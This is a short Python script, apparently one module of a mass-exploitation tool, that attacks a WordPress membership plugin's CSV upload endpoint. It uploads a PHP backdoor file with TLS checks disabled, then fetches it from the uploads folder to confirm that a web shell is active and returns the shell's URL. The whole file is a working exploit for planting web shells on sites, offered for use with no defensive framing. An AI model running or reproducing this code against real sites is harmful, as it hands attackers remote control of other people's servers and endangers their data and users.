import re
import requests

requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

def wp_woocommerce217(url, headers):
        endpoint = url + "/wp-admin/admin-ajax.php?action=wps_membership_csv_file_upload"
        shell = open('backdoor/falcata.php', 'rb')
        headers['content-type'] = 'multipart/form-data'
        options = {
            'file': shell,
            'type': 'text/csv'
        }
        requests.post(endpoint, data=options,headers=headers,verify=False).text
        dump_data = url + "wp-content/uploads/mfw-activity-logger/csv-uploads/falcata.php?Infected=Y"
        res = requests.get(dump_data,headers=headers,verify=False).text
        check_woo = re.findall("Infected Y", res)
        if check_woo:
            return dict(
                url=url,
                name="woocommerce   ",
                status=True,
                shell=dump_data
            )
        else:
            return dict(
                url=url,
                name="woocommerce   ",
                status=False
            )